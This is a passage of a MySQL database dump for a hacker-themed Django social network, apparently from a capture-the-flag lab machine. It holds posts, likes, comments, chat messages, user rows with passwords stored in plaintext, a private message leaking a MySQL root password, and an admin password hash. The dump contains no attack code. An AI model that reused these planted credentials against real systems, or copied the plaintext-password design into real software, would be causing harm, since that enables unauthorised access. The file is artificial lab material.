(24,'Just finished developing a new virus that’s designed to spread rapidly across networks. It’s a hybrid of several different strains, combining the best features of each. Of course, it’s for research purposes only—time to see how it performs in the wild.','2024-06-02 14:29:11.000000',8,0,0,23),
(25,'Studying the evolution of viruses is fascinating. I’ve been tracking the development of a new strain that’s been causing havoc recently. It’s incredibly sophisticated, but I’ve identified a few weaknesses. Writing up a report on how to defend against it.','2024-11-02 17:49:34.000000',9,0,0,23),
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
/*!40000 ALTER TABLE `SocialNetwork_socialarticle` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialarticle_likes`
--

DROP TABLE IF EXISTS `SocialNetwork_socialarticle_likes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialarticle_likes` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `socialarticle_id` bigint(20) NOT NULL,
  `socialuser_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `SocialNetwork_socialarti_socialarticle_id_socialu_44364a80_uniq` (`socialarticle_id`,`socialuser_id`),
  KEY `SocialNetwork_social_socialuser_id_f84a535a_fk_SocialNet` (`socialuser_id`),
  CONSTRAINT `SocialNetwork_social_socialarticle_id_0ac522cf_fk_SocialNet` FOREIGN KEY (`socialarticle_id`) REFERENCES `SocialNetwork_socialarticle` (`id`),
  CONSTRAINT `SocialNetwork_social_socialuser_id_f84a535a_fk_SocialNet` FOREIGN KEY (`socialuser_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=190 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialarticle_likes`
--

LOCK TABLES `SocialNetwork_socialarticle_likes` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialarticle_likes` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialarticle_likes` VALUES
(164,1,4),
(142,1,7),
(121,1,10),
(107,1,12),
(97,1,13),
(83,1,15),
(67,1,17),
(57,1,19),
(19,1,24),
(182,2,2),
(171,2,3),
(163,2,4),
(141,2,7),
(88,2,14),
(50,2,20),
(42,2,21),
(28,2,23),
(184,3,1),
(178,3,2),
(161,3,4),
(147,3,6),
(132,3,8),
(117,3,10),
(87,3,14),
(72,3,16),
(48,3,20),
(39,3,21),
(25,3,23),
(15,3,24),
(173,4,3),
(151,4,6),
(115,4,11),
(108,4,12),
(77,4,16),
(68,4,17),
(31,4,23),
(20,4,24),
(9,4,25),
(185,5,1),
(180,5,2),
(170,5,3),
(140,5,7),
(133,5,8),
(118,5,10),
(112,5,11),
(81,5,15),
(73,5,16),
(64,5,17),
(54,5,19),
(16,5,24),
(5,5,25),
(176,6,2),
(154,6,5),
(145,6,6),
(124,6,9),
(103,6,12),
(85,6,14),
(46,6,20),
(2,6,25),
(155,7,5),
(94,7,13),
(61,7,17),
(4,7,25),
(130,8,8),
(162,9,4),
(104,9,12),
(62,9,17),
(49,9,20),
(40,9,21),
(26,9,23),
(175,10,2),
(144,10,6),
(137,10,7),
(122,10,9),
(100,10,12),
(70,10,16),
(36,10,21),
(11,10,24),
(1,10,25),
(188,11,1),
(166,11,4),
(158,11,5),
(152,11,6),
(143,11,7),
(128,11,9),
(109,11,12),
(84,11,15),
(78,11,16),
(69,11,17),
(45,11,21),
(10,11,25),
(105,12,12),
(157,13,5),
(135,13,8),
(127,13,9),
(98,13,13),
(90,13,14),
(44,13,21),
(8,13,25),
(177,14,2),
(169,14,3),
(92,14,13),
(71,14,16),
(47,14,20),
(23,14,23),
(13,14,24),
(179,15,2),
(168,15,3),
(160,15,4),
(146,15,6),
(138,15,7),
(131,15,8),
(123,15,9),
(111,15,11),
(102,15,12),
(93,15,13),
(86,15,14),
(80,15,15),
(60,15,17),
(53,15,19),
(38,15,21),
(33,15,22),
(24,15,23),
(14,15,24),
(3,15,25),
(181,16,2),
(172,16,3),
(156,16,5),
(134,16,8),
(119,16,10),
(82,16,15),
(75,16,16),
(51,16,20),
(35,16,22),
(7,16,25),
(63,17,17),
(66,18,17),
(187,21,1),
(149,21,6),
(126,21,9),
(113,21,11),
(106,21,12),
(96,21,13),
(74,21,16),
(65,21,17),
(56,21,19),
(29,21,23),
(18,21,24),
(6,21,25),
(183,22,1),
(167,22,3),
(159,22,4),
(153,22,5),
(129,22,8),
(116,22,10),
(110,22,11),
(91,22,13),
(79,22,15),
(59,22,17),
(52,22,19),
(37,22,21),
(22,22,23),
(12,22,24),
(189,23,18),
(174,24,3),
(165,24,4),
(136,24,8),
(120,24,10),
(99,24,13),
(58,24,19),
(32,24,23),
(21,24,24),
(186,25,1),
(148,25,6),
(125,25,9),
(95,25,13),
(55,25,19),
(41,25,21),
(34,25,22),
(27,25,23),
(17,25,24),
(150,26,6),
(114,26,11),
(89,26,14),
(76,26,16),
(43,26,21),
(30,26,23);
/*!40000 ALTER TABLE `SocialNetwork_socialarticle_likes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialcomment`
--

DROP TABLE IF EXISTS `SocialNetwork_socialcomment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialcomment` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `text` longtext NOT NULL,
  `date` datetime(6) NOT NULL,
  `article_id` bigint(20) NOT NULL,
  `author_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_social_article_id_09c62d03_fk_SocialNet` (`article_id`),
  KEY `SocialNetwork_social_author_id_4235a6b2_fk_SocialNet` (`author_id`),
  CONSTRAINT `SocialNetwork_social_article_id_09c62d03_fk_SocialNet` FOREIGN KEY (`article_id`) REFERENCES `SocialNetwork_socialarticle` (`id`),
  CONSTRAINT `SocialNetwork_social_author_id_4235a6b2_fk_SocialNet` FOREIGN KEY (`author_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialcomment`
--

LOCK TABLES `SocialNetwork_socialcomment` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialcomment` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialcomment` VALUES
(1,'Great work, whitehat! It\'s awesome to see ethical hacking being used for good, especially for organizations that might not have the resources to maintain top-tier security. Those vulnerabilities could have been devastating if left unchecked. Keep up the great work—you\'re making the internet a safer place for everyone!','2025-01-28 20:45:22.000000',22,5),
(2,'Love seeing hackers use their skills for positive change! Nonprofits often overlook cybersecurity due to budget constraints, so your work here is invaluable. I’d be interested to know what kind of vulnerabilities you found—anything that stood out as particularly surprising?','2025-01-30 12:32:53.000000',22,3),
(3,'Yikes! It\'s scary how many people still use unsecured networks without thinking twice. Capturing unencrypted data is like finding an open vault. This is a good reminder for everyone to always use a VPN when connecting to public Wi-Fi. Encryption should be non-negotiable in today’s world.','2024-12-16 16:29:12.000000',15,19),
(4,'That’s a goldmine of data, but also a stark reminder of how vulnerable people are when they don’t take basic precautions. It’s amazing how many networks are still left wide open. Hopefully, posts like this will encourage more users to secure their communications.','2024-12-31 12:13:56.000000',15,23),
(5,'Unencrypted data on a public network is a hacker’s dream and a user’s nightmare. It\'s shocking how many people still don\'t realize the risks of using insecure Wi-Fi. This should be a wake-up call for anyone who thinks they’re safe without encryption.','2025-01-06 22:31:25.000000',15,8),
(6,'That’s a huge find! It’s incredible how often \'uncrackable\' encryption schemes turn out to have vulnerabilities in their implementation. Can’t wait to hear more about this at the conference—this could have major implications for anyone relying on that scheme for security.','2025-01-21 23:12:45.000000',6,9),
(7,'Finding a zero-day is like hitting the jackpot! It’s great to hear you’re taking the responsible disclosure route—those IoT devices are in so many homes, and an exploit like this could cause massive damage if it fell into the wrong hands. Looking forward to reading your documentation.','2024-11-28 04:58:23.000000',5,14),
(8,'Zero-days in IoT devices are especially concerning given how widespread they are. Your work could be crucial in preventing a potential disaster. Kudos for emphasizing responsible disclosure—can’t wait to see how this unfolds.','2024-12-23 18:34:55.000000',5,2),
(9,'Exploits that take time usually turn out to be the most sophisticated and effective. The mix of creativity and technical skill is what sets great work apart—looking forward to seeing the final result. Your write-up will definitely be a valuable read!','2024-10-27 16:12:58.000000',21,13),
(10,'Brute force may be old-school, but it’s hard to argue with results. Efficiency improvements could make this technique even more formidable—can’t wait to see your guide on optimizing it. It\'s always fascinating to see how these methods evolve.','2024-08-31 15:59:35.000000',26,20),
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
/*!40000 ALTER TABLE `SocialNetwork_socialcomment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialmessage`
--

DROP TABLE IF EXISTS `SocialNetwork_socialmessage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialmessage` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `date` datetime(6) NOT NULL,
  `text` longtext NOT NULL,
  `is_read` tinyint(1) NOT NULL,
  `from_user_id` bigint(20) NOT NULL,
  `to_user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_social_from_user_id_c7b711b1_fk_SocialNet` (`from_user_id`),
  KEY `SocialNetwork_social_to_user_id_5dc6657d_fk_SocialNet` (`to_user_id`),
  CONSTRAINT `SocialNetwork_social_from_user_id_c7b711b1_fk_SocialNet` FOREIGN KEY (`from_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`),
  CONSTRAINT `SocialNetwork_social_to_user_id_5dc6657d_fk_SocialNet` FOREIGN KEY (`to_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=53 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialmessage`
--

LOCK TABLES `SocialNetwork_socialmessage` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialmessage` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialmessage` VALUES
(1,'2024-12-27 17:19:17.907990','Hey! Have you seen the latest episode of Space Chronicles?',1,11,1),
(2,'2024-12-27 17:19:34.532931','No spoilers! I’m planning to watch it tonight. Is it good?',1,1,11),
(3,'2024-12-27 17:19:51.380822','Oh, it’s amazing! Lots of twists. You’re going to love it.',1,11,1),
(4,'2024-12-27 17:20:09.524879','Can’t wait. Should I prepare for any emotional rollercoasters?',1,1,11),
(5,'2024-12-27 17:20:24.703076','Definitely. Keep tissues nearby.',0,11,1),
(6,'2024-12-27 17:21:03.637268','Hey, are you free this weekend?',1,15,5),
(7,'2024-12-27 17:21:17.031076','Not sure yet. What’s up?',1,5,15),
(8,'2024-12-27 17:21:38.885214','I was thinking we could go hiking. Weather looks perfect.',1,15,5),
(9,'2024-12-27 17:21:54.399481','Sounds fun! Let me check my schedule and get back to you.',1,5,15),
(10,'2024-12-27 17:22:08.019864','Cool. Let me know by Friday, so I can plan accordingly.',1,15,5),
(11,'2024-12-27 17:22:37.655136','I need some advice on buying a new laptop. Any recommendations?',1,24,9),
(12,'2024-12-27 17:22:57.853152','Sure! What’s your budget and primary use?',1,9,24),
(13,'2024-12-27 17:23:16.411365','Around $1,000. Mostly for work and light gaming.',1,24,9),
(14,'2024-12-27 17:23:35.110384','Check out the Dell XPS 13 or the ASUS ROG Zephyrus G14. Both are great options.',1,9,24),
(15,'2024-12-27 17:23:51.799717','Thanks! I’ll look into those.',1,24,9),
(16,'2024-12-27 17:24:14.407907','I’m stuck on level 12 of Mystic Quest. Any tips?',1,13,7),
(17,'2024-12-27 17:24:28.926127','Oh, that level’s tricky. Focus on upgrading your shield first.',1,7,13),
(18,'2024-12-27 17:24:42.848217','Got it. What about the boss fight?',1,13,7),
(19,'2024-12-27 17:24:58.353582','Use ranged attacks and dodge a lot. Timing is key.',1,7,13),
(20,'2024-12-27 17:25:12.656028','Thanks! I’ll give it another shot.',1,13,7),
(26,'2024-12-27 17:33:47.519350','Cool. If anything goes wrong, ping me immediately.',1,18,22),
(27,'2024-12-27 17:34:23.653244','Did you hear about the new coffee shop downtown?',1,23,3),
(28,'2024-12-27 17:34:51.679363','Yeah, I went there last week. The caramel latte is amazing.',1,3,23),
(29,'2024-12-27 17:35:06.719977','I’ll have to try it. Is the place cozy?',1,3,23),
(30,'2024-12-27 17:35:24.313146','Very! Great ambiance and fast Wi-Fi. Perfect for working or relaxing.',1,23,3),
(31,'2024-12-27 17:35:41.999268','Awesome. Thanks for the recommendation!',1,3,23),
(32,'2024-12-27 17:37:11.511414','How’s your project coming along?',1,14,6),
(33,'2024-12-27 17:37:26.256242','Slowly but surely. Still working on the presentation slides.',1,6,14),
(34,'2024-12-27 17:37:40.536775','Need any help? I’ve got some free time today.',1,14,6),
(35,'2024-12-27 17:37:58.090203','That would be great! Could you review my draft?',1,6,14),
(36,'2024-12-27 17:38:10.857903','Sure thing. Send it over.',1,14,6),
(37,'2024-12-29 00:43:02.032982','What’s the best way to cook pasta al dente?',1,19,4),
(38,'2024-12-29 00:43:22.235116','Simple! Boil water, add salt, and cook the pasta 1-2 minutes less than the package says.',1,4,19),
(39,'2024-12-29 00:43:41.270862','Do I need to add oil to the water?',1,19,4),
(40,'2024-12-29 00:44:01.955971','No, just stir occasionally to prevent sticking.',1,4,19),
(41,'2024-12-29 00:44:19.343381','Got it. Thanks for the tip!',0,19,4),
(42,'2024-12-29 00:44:55.904749','I’m thinking of adopting a cat. Any advice?',1,6,17),
(43,'2024-12-29 00:45:30.956924','That’s wonderful! Make sure you’re ready for the commitment.',1,17,6),
(44,'2024-12-29 00:45:46.032343','Any specific breeds you’d recommend?',1,6,17),
(45,'2024-12-29 00:46:06.445022','Depends on your lifestyle. Maine Coons are friendly but require grooming.',1,17,6),
(46,'2024-12-29 00:46:23.445332','Good to know. Thanks!',1,6,17),
(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(49,'2024-12-29 20:30:14.430878','Just tweaking some schema settings for the new project. Won’t take long, I promise.',1,22,18),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
(51,'2024-12-29 20:30:56.880458','Got it. Thanks a lot! I’ll let you know as soon as I’m finished.',1,22,18),
(52,'2024-12-29 20:31:16.112930','Cool. If anything goes wrong, ping me immediately.',0,18,22);
/*!40000 ALTER TABLE `SocialNetwork_socialmessage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialuser`
--

DROP TABLE IF EXISTS `SocialNetwork_socialuser`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialuser` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `email` varchar(100) NOT NULL,
  `username` varchar(30) NOT NULL,
  `password` varchar(70) NOT NULL,
  `picture` varchar(100) NOT NULL,
  `about` longtext NOT NULL,
  `contact_requests` int(11) NOT NULL,
  `unread_messages` int(11) NOT NULL,
  `is_public` tinyint(1) NOT NULL,
  `is_hidden` tinyint(1) NOT NULL,
  `two_fa` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `email` (`email`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialuser`
--

LOCK TABLES `SocialNetwork_socialuser` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialuser` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialuser` VALUES
(1,'cyberghost@darkmail.net','cyberghost','Gh0stH@cker2024','1.jpg','A digital nomad with a knack for uncovering vulnerabilities in the deep web. Passionate about cryptography and secure communications.',0,0,1,0,0),
(2,'hexhunter@ciphermail.com','hexhunter','H3xHunt3r!','2.jpg','A seasoned reverse engineer specializing in binary exploitation. Loves diving into hex editors and uncovering hidden data.',0,0,1,0,0),
(3,'rootbreaker@exploitmail.net','rootbreaker','R00tBr3@ker#','3.jpg','Expert in privilege escalation and bypassing security measures. Always on the lookout for new zero-day vulnerabilities.',0,0,1,0,0),
(4,'zero_day@hushmail.com','zero_day','Zer0D@yH@ck','4.jpg','Focused on discovering zero-day vulnerabilities and creating proof-of-concept exploits. A dark web enthusiast.',0,0,1,0,0),
(5,'cryptoraven@securemail.org','cryptoraven','CrYptoR@ven42','5.jpg','Cryptography expert with a love for breaking and creating secure communication protocols. Always one step ahead in the encryption game.',0,0,1,0,0),
(6,'shadowcaster@darkmail.net','shadowcaster','Sh@d0wC@st!','6.jpg','Specializes in social engineering and OSINT techniques. A master of blending into the digital shadows.',0,0,1,0,0),
(7,'blackhat_wolf@cypherx.com','blackhat_wolf','Bl@ckW0lfH@ck','7.png','A black hat hacker with a passion for ransomware development. Has a reputation for leaving no trace behind.',0,0,1,0,0),
(8,'bytebandit@exploitmail.net','bytebandit','Byt3B@nd!t123','8.png','A skilled penetration tester and ethical hacker. Enjoys dismantling security systems and exposing their weaknesses.',0,0,0,0,0),
(9,'glitch@cypherx.com','glitch','Gl1tchH@ckz','9.png','Specializes in glitching and fault injection attacks. Loves causing unexpected behavior in software and hardware.',0,0,1,0,0),
(10,'datadive@darkmail.net','datadive','D@taD1v3r','10.png','A data miner and analyst with a focus on extracting and analyzing large datasets from breached databases.',0,0,1,0,0),
(11,'phreaker@securemail.org','phreaker','Phre@k3rH@ck','11.png','Old-school hacker with roots in phone phreaking. Now enjoys exploiting telecom systems and VoIP networks.',0,0,0,0,0),
(12,'codebreaker@ciphermail.com','codebreaker','C0d3Br3@k!','12.png','A programmer with a talent for writing malicious code and cracking software protections. Loves breaking encryption algorithms.',0,0,0,0,0),
(13,'netninja@hushmail.com','netninja','N3tN1nj@2024','13.png','Network security expert focused on intrusion detection and prevention. Known for slicing through firewalls with ease.',0,0,1,0,0),
(14,'packetpirate@exploitmail.net','packetpirate','P@ck3tP!rat3','14.png','A packet sniffer who loves capturing and analyzing network traffic. Always hunting for sensitive data in the ether.',0,0,1,0,0),
(15,'darkseeker@darkmail.net','darkseeker','D@rkSeek3r#','15.png','A hacker who thrives in the dark web. Specializes in anonymity tools and hidden service exploitation.',0,0,1,0,0),
(16,'shadowmancer@cypherx.com','shadowmancer','Sh@d0wM@ncer','16.png','A master of disguise in the digital world, using cloaking techniques and evasion tactics to remain unseen.',0,0,1,0,0),
(17,'trojanhorse@securemail.org','trojanhorse','Tr0j@nH0rse!','17.jpg','Malware developer with a focus on creating and deploying Trojan horses. Enjoys watching systems crumble from within.',0,0,0,0,0),
(18,'mikey@hacknet.htb','backdoor_bandit','mYd4rks1dEisH3re','18.jpg','Specializes in creating and exploiting backdoors in systems. Always leaves a way back in after an attack.',0,0,0,0,1),
(19,'exploit_wizard@hushmail.com','exploit_wizard','Expl01tW!zard','19.jpg','An expert in exploit development and vulnerability research. Loves crafting new ways to break into systems.',0,0,1,0,0),
(20,'stealth_hawk@exploitmail.net','stealth_hawk','St3@lthH@wk','20.jpg','Focuses on stealth operations, avoiding detection while infiltrating systems. A ghost in the machine.',0,0,1,0,0),
(21,'whitehat@darkmail.net','whitehat','Wh!t3H@t2024','21.jpg','An ethical hacker with a mission to improve cybersecurity. Works to protect systems by exposing and patching vulnerabilities.',0,0,1,0,0),
(22,'deepdive@hacknet.htb','deepdive','D33pD!v3r','22.png','Specializes in deep web exploration and data extraction. Always looking for hidden gems in the darkest corners of the web.',0,0,0,0,1),
(23,'virus_viper@securemail.org','virus_viper','V!rusV!p3r2024','23.jpg','A malware creator focused on developing viruses that spread rapidly. Known for unleashing digital plagues.',0,0,1,0,0),
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
(25,'shadowwalker@hushmail.com','shadowwalker','Sh@dowW@lk2024','25.jpg','A digital infiltrator who excels in covert operations. Always finds a way to walk through the shadows undetected.',0,0,0,0,0);
/*!40000 ALTER TABLE `SocialNetwork_socialuser` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialuser_contacts`
--

DROP TABLE IF EXISTS `SocialNetwork_socialuser_contacts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialuser_contacts` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `from_socialuser_id` bigint(20) NOT NULL,
  `to_socialuser_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `SocialNetwork_socialuser_from_socialuser_id_to_so_d031d178_uniq` (`from_socialuser_id`,`to_socialuser_id`),
  KEY `SocialNetwork_social_to_socialuser_id_8d638620_fk_SocialNet` (`to_socialuser_id`),
  CONSTRAINT `SocialNetwork_social_from_socialuser_id_0253669d_fk_SocialNet` FOREIGN KEY (`from_socialuser_id`) REFERENCES `SocialNetwork_socialuser` (`id`),
  CONSTRAINT `SocialNetwork_social_to_socialuser_id_8d638620_fk_SocialNet` FOREIGN KEY (`to_socialuser_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialuser_contacts`
--

LOCK TABLES `SocialNetwork_socialuser_contacts` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialuser_contacts` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialuser_contacts` VALUES
(1,18,22),
(3,21,25),
(2,22,18),
(4,25,21);
/*!40000 ALTER TABLE `SocialNetwork_socialuser_contacts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group`
--

DROP TABLE IF EXISTS `auth_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_group` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(150) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group`
--

LOCK TABLES `auth_group` WRITE;
/*!40000 ALTER TABLE `auth_group` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group_permissions`
--

DROP TABLE IF EXISTS `auth_group_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_group_permissions` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `group_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_group_permissions_group_id_permission_id_0cd325b0_uniq` (`group_id`,`permission_id`),
  KEY `auth_group_permissio_permission_id_84c5c92e_fk_auth_perm` (`permission_id`),
  CONSTRAINT `auth_group_permissio_permission_id_84c5c92e_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  CONSTRAINT `auth_group_permissions_group_id_b120cbf9_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group_permissions`
--

LOCK TABLES `auth_group_permissions` WRITE;
/*!40000 ALTER TABLE `auth_group_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_permission`
--

DROP TABLE IF EXISTS `auth_permission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_permission` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `content_type_id` int(11) NOT NULL,
  `codename` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_permission_content_type_id_codename_01ab375a_uniq` (`content_type_id`,`codename`),
  CONSTRAINT `auth_permission_content_type_id_2f476e4b_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=45 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_permission`
--

LOCK TABLES `auth_permission` WRITE;
/*!40000 ALTER TABLE `auth_permission` DISABLE KEYS */;
INSERT INTO `auth_permission` VALUES
(1,'Can add log entry',1,'add_logentry'),
(2,'Can change log entry',1,'change_logentry'),
(3,'Can delete log entry',1,'delete_logentry'),
(4,'Can view log entry',1,'view_logentry'),
(5,'Can add permission',2,'add_permission'),
(6,'Can change permission',2,'change_permission'),
(7,'Can delete permission',2,'delete_permission'),
(8,'Can view permission',2,'view_permission'),
(9,'Can add group',3,'add_group'),
(10,'Can change group',3,'change_group'),
(11,'Can delete group',3,'delete_group'),
(12,'Can view group',3,'view_group'),
(13,'Can add user',4,'add_user'),
(14,'Can change user',4,'change_user'),
(15,'Can delete user',4,'delete_user'),
(16,'Can view user',4,'view_user'),
(17,'Can add content type',5,'add_contenttype'),
(18,'Can change content type',5,'change_contenttype'),
(19,'Can delete content type',5,'delete_contenttype'),
(20,'Can view content type',5,'view_contenttype'),
(21,'Can add session',6,'add_session'),
(22,'Can change session',6,'change_session'),
(23,'Can delete session',6,'delete_session'),
(24,'Can view session',6,'view_session'),
(25,'Can add social article',7,'add_socialarticle'),
(26,'Can change social article',7,'change_socialarticle'),
(27,'Can delete social article',7,'delete_socialarticle'),
(28,'Can view social article',7,'view_socialarticle'),
(29,'Can add social user',8,'add_socialuser'),
(30,'Can change social user',8,'change_socialuser'),
(31,'Can delete social user',8,'delete_socialuser'),
(32,'Can view social user',8,'view_socialuser'),
(33,'Can add social message',9,'add_socialmessage'),
(34,'Can change social message',9,'change_socialmessage'),
(35,'Can delete social message',9,'delete_socialmessage'),
(36,'Can view social message',9,'view_socialmessage'),
(37,'Can add social comment',10,'add_socialcomment'),
(38,'Can change social comment',10,'change_socialcomment'),
(39,'Can delete social comment',10,'delete_socialcomment'),
(40,'Can view social comment',10,'view_socialcomment'),
(41,'Can add contact request',11,'add_contactrequest'),
(42,'Can change contact request',11,'change_contactrequest'),
(43,'Can delete contact request',11,'delete_contactrequest'),
(44,'Can view contact request',11,'view_contactrequest');
/*!40000 ALTER TABLE `auth_permission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user`
--

DROP TABLE IF EXISTS `auth_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `password` varchar(128) NOT NULL,
  `last_login` datetime(6) DEFAULT NULL,
  `is_superuser` tinyint(1) NOT NULL,
  `username` varchar(150) NOT NULL,
  `first_name` varchar(150) NOT NULL,
  `last_name` varchar(150) NOT NULL,
  `email` varchar(254) NOT NULL,
  `is_staff` tinyint(1) NOT NULL,
  `is_active` tinyint(1) NOT NULL,
  `date_joined` datetime(6) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user`
--

LOCK TABLES `auth_user` WRITE;
/*!40000 ALTER TABLE `auth_user` DISABLE KEYS */;
INSERT INTO `auth_user` VALUES
(1,'pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ=','2024-12-29 20:31:31.793215',1,'admin','','','',1,1,'2024-08-08 18:17:54.472758');
/*!40000 ALTER TABLE `auth_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_groups`
--

DROP TABLE IF EXISTS `auth_user_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user_groups` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
